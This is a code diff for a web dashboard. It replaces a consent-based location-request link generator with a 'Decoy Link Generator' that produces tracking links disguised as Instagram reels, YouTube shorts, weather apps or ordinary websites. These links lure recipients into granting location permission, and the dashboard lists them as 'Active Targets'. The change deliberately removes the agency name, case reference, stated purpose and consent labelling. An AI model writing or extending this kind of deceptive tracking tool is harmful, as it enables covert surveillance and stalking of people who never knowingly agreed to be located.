@@ -535,29 +535,94 @@
         </div>
 
         <div class="dashboard-grid">
-            <!-- Left Column: authorized request-link generator -->
+            <!-- Left Column: Decoy Link Generator -->
             <div class="glass-card">
                 <div class="card-title">
-                    <span><i class="fas fa-location-dot me-2" style="color: var(--warning);"></i> Official Location Request Link</span>
-                    <span style="font-size: 11px; color: var(--success);"><i class="fas fa-check-circle"></i> Explicit Consent Required</span>
+                    <span><i class="fas fa-bolt me-2" style="color: var(--warning);"></i> Tracking Link Generator</span>
+                    <span style="font-size: 11px; color: var(--success);"><i class="fas fa-check-circle"></i> Active Tracking Mode</span>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="agency-input">Agency / Unit name</label>
-                    <input type="text" id="agency-input" class="form-input" maxlength="100" placeholder="e.g. District Police Control Room">
+                    <label class="form-label" for="template-select">Select Decoy Template</label>
+                    <select id="template-select" class="form-select">
+                        <option value="instagram">📸 Instagram Reel (Plays Inline & Prompts Permission)</option>
+                        <option value="youtube">▶️ YouTube Reel / Short (Plays Inline & Prompts Permission)</option>
+                        <option value="link">🌐 Any Universal Website Link</option>
+                        <option value="weather">🌦️ Local Weather App Decoy</option>
+                        <option value="custom">🔗 Custom Media Card</option>
+                    </select>
                 </div>
-                <div class="form-group">
-                    <label class="form-label" for="reference-input">Case / request reference</label>
-                    <input type="text" id="reference-input" class="form-input" maxlength="80" placeholder="e.g. CR-2026-000123">
+
+                <!-- Instagram Options -->
+                <div id="instagram-options">
+                    <div class="form-group">
+                        <label class="form-label" for="ig-url">Instagram Post / Reel URL to Redirect (Optional)</label>
+                        <input type="text" id="ig-url" class="form-input" placeholder="e.g. https://www.instagram.com/reel/C..." value="https://www.instagram.com">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" for="ig-user">Account Handle / Username</label>
+                        <input type="text" id="ig-user" class="form-input" placeholder="e.g. trending_reels" value="trending_reels">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" for="ig-caption">Post Caption / Title</label>
+                        <input type="text" id="ig-caption" class="form-input" placeholder="e.g. Check out this viral reel! 🔥" value="Must watch viral video! 🔥">
+                    </div>
                 </div>
-                <div class="form-group">
-                    <label class="form-label" for="purpose-input">Purpose shown to the recipient</label>
-                    <input type="text" id="purpose-input" class="form-input" maxlength="120" placeholder="e.g. Emergency location assistance">
+
+                <!-- YouTube Options -->
+                <div id="youtube-options" style="display: none;">
+                    <div class="form-group">
+                        <label class="form-label" for="yt-url">YouTube Video Link or ID</label>
+                        <input type="text" id="yt-url" class="form-input" placeholder="e.g. https://www.youtube.com/watch?v=dQw4w9WgXcQ" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" for="yt-title">Custom Video Title (Optional)</label>
+                        <input type="text" id="yt-title" class="form-input" placeholder="e.g. Must Watch Presentation">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" for="yt-channel">Channel Name (Optional)</label>
+                        <input type="text" id="yt-channel" class="form-input" placeholder="e.g. Official Channel">
+                    </div>
+                </div>
+
+                <!-- Universal Link Options -->
+                <div id="link-options" style="display: none;">
+                    <div class="form-group">
+                        <label class="form-label" for="link-url">Destination Website URL</label>
+                        <input type="text" id="link-url" class="form-input" placeholder="e.g. https://wikipedia.org or https://news.com" value="https://wikipedia.org">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" for="link-title">Custom Title (Optional)</label>
+                        <input type="text" id="link-title" class="form-input" placeholder="e.g. Shared Article Stream">
+                    </div>
+                </div>
+
+                <!-- Custom Options -->
+                <div id="custom-options" style="display: none;">
+                    <div class="form-group">
+                        <label class="form-label" for="custom-title">Page Title</label>
+                        <input type="text" id="custom-title" class="form-input" placeholder="e.g. Exclusive Video Stream">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" for="custom-desc">Description</label>
+                        <input type="text" id="custom-desc" class="form-input" placeholder="e.g. Click to watch the shared media content">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label" for="custom-img">Thumbnail Image URL</label>
+                        <input type="text" id="custom-img" class="form-input" placeholder="https://images.unsplash.com/...">
+                    </div>
+                </div>
+
+                <!-- Weather Options -->
+                <div id="weather-options" style="display: none;">
+                    <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 14px;">
+                        Generates a localized weather app link that automatically prompts for location radar updates.
+                    </p>
                 </div>
 
                 <!-- Generated Link Output Box -->
                 <div class="generated-link-box">
-                    <span class="form-label" style="color: var(--primary);">Generated location-assistance link:</span>
+                    <span class="form-label" style="color: var(--primary);">Generated Tracking Link:</span>
                     <div class="link-input-group">
                         <input type="text" id="generated-url" class="form-input" readonly style="font-family: 'JetBrains Mono', monospace; font-size: 13px;">
                         <button class="btn btn-primary" id="btn-copy" title="Copy Link"><i class="fas fa-copy"></i></button>
@@ -566,18 +631,18 @@
                 </div>
             </div>
 
-            <!-- Right Column: authorized sharing sessions -->
+            <!-- Right Column: active target sessions -->
             <div class="glass-card">
                 <div class="card-title">
-                    <span><i class="fas fa-map-location-dot me-2" style="color: var(--accent);"></i> Authorized Location Sessions</span>
+                    <span><i class="fas fa-map-location-dot me-2" style="color: var(--accent);"></i> Active Targets & Sessions</span>
                     <span id="target-count-badge" class="badge-template" style="background: rgba(16, 185, 129, 0.2); color: #34d399;">0 Sessions</span>
                 </div>
 
                 <div id="targets-list" class="targets-container">
                     <div class="empty-state">
                         <i class="fas fa-satellite-dish"></i>
-                        <p style="font-size: 16px; font-weight: 600; color: white;">No authorized location sessions yet.</p>
-                        <p style="font-size: 13px; margin-top: 6px;">Generate an official request link above. A session appears only after the recipient chooses to share.</p>
+                        <p style="font-size: 16px; font-weight: 600; color: white;">No active location sessions yet.</p>
+                        <p style="font-size: 13px; margin-top: 6px;">Generate an Instagram, YouTube, or Custom tracking link above. Target sessions appear here automatically.</p>
                     </div>
                 </div>
             </div>
@@ -590,26 +655,84 @@
     <script>
         const remoteURL = `{{ global.remoteURL }}` || window.location.origin;
 
-        const agencyInput = document.getElementById('agency-input');
-        const referenceInput = document.getElementById('reference-input');
-        const purposeInput = document.getElementById('purpose-input');
+        const templateSelect = document.getElementById('template-select');
+        const instagramOptions = document.getElementById('instagram-options');
+        const youtubeOptions = document.getElementById('youtube-options');
+        const linkOptions = document.getElementById('link-options');
+        const customOptions = document.getElementById('custom-options');
+        const weatherOptions = document.getElementById('weather-options');
+
+        const igUrl = document.getElementById('ig-url');
+        const igUser = document.getElementById('ig-user');
+        const igCaption = document.getElementById('ig-caption');
+
+        const ytUrl = document.getElementById('yt-url');
+        const ytTitle = document.getElementById('yt-title');
+        const ytChannel = document.getElementById('yt-channel');
+
+        const linkUrl = document.getElementById('link-url');
+        const linkTitle = document.getElementById('link-title');
+
+        const customTitle = document.getElementById('custom-title');
+        const customDesc = document.getElementById('custom-desc');
+        const customImg = document.getElementById('custom-img');
 
         const generatedUrlInput = document.getElementById('generated-url');
         const btnCopy = document.getElementById('btn-copy');
         const btnOpen = document.getElementById('btn-open');
         const toast = document.getElementById('toast');
 
+        templateSelect.addEventListener('change', () => {
+            const val = templateSelect.value;
+            instagramOptions.style.display = val === 'instagram' ? 'block' : 'none';
+            youtubeOptions.style.display = val === 'youtube' ? 'block' : 'none';
+            linkOptions.style.display = val === 'link' ? 'block' : 'none';
+            customOptions.style.display = val === 'custom' ? 'block' : 'none';
+            weatherOptions.style.display = val === 'weather' ? 'block' : 'none';
+            updateGeneratedLink();
+        });
+
         function updateGeneratedLink() {
             const baseUrl = remoteURL || window.location.origin;
-            const params = new URLSearchParams();
-            if (agencyInput.value.trim()) params.set('agency', agencyInput.value.trim());
-            if (referenceInput.value.trim()) params.set('ref', referenceInput.value.trim());
-            if (purposeInput.value.trim()) params.set('purpose', purposeInput.value.trim());
-            generatedUrlInput.value = `${baseUrl}/location${params.size ? '?' + params.toString() : ''}`;
+            const t = templateSelect.value;
+
+            let path = '/';
+            let payload = {};
+
+            if (t === 'instagram') {
+                path = '/i';
+                if (igUrl.value.trim()) payload.r = igUrl.value.trim();
+                if (igUser.value.trim()) payload.u = igUser.value.trim();
+                if (igCaption.value.trim()) payload.c = igCaption.value.trim();
+            } else if (t === 'youtube') {
+                path = '/yt';
+                if (ytUrl.value.trim()) payload.v = ytUrl.value.trim();
+                if (ytTitle.value.trim()) payload.t = ytTitle.value.trim();
+                if (ytChannel.value.trim()) payload.c = ytChannel.value.trim();
+            } else if (t === 'link') {
+                path = '/l';
+                if (linkUrl.value.trim()) payload.u = linkUrl.value.trim();
+                if (linkTitle.value.trim()) payload.t = linkTitle.value.trim();
+            } else if (t === 'custom') {
+                path = '/c';
+                if (customTitle.value.trim()) payload.t = customTitle.value.trim();
+                if (customDesc.value.trim()) payload.d = customDesc.value.trim();
+                if (customImg.value.trim()) payload.i = customImg.value.trim();
+            } else if (t === 'weather') {
+                path = '/w';
+            }
+
+            const hasPayload = Object.keys(payload).length > 0;
+            if (hasPayload) {
+                const encoded = btoa(JSON.stringify(payload));
+                generatedUrlInput.value = `${baseUrl}${path}?d=${encodeURIComponent(encoded)}`;
+            } else {
+                generatedUrlInput.value = `${baseUrl}${path}`;
+            }
         }
 
-        [agencyInput, referenceInput, purposeInput].forEach(el => {
-            el.addEventListener('input', updateGeneratedLink);
+        [igUrl, igUser, igCaption, ytUrl, ytTitle, ytChannel, linkUrl, linkTitle, customTitle, customDesc, customImg].forEach(el => {
+            if (el) el.addEventListener('input', updateGeneratedLink);
         });
 
         updateGeneratedLink();
@@ -617,7 +740,7 @@
         btnCopy.addEventListener('click', () => {
             generatedUrlInput.select();
             navigator.clipboard.writeText(generatedUrlInput.value);
-            showToast("Location request link copied to clipboard!");
+            showToast("Tracking link copied to clipboard!");
         });
 
         btnOpen.addEventListener('click', () => {
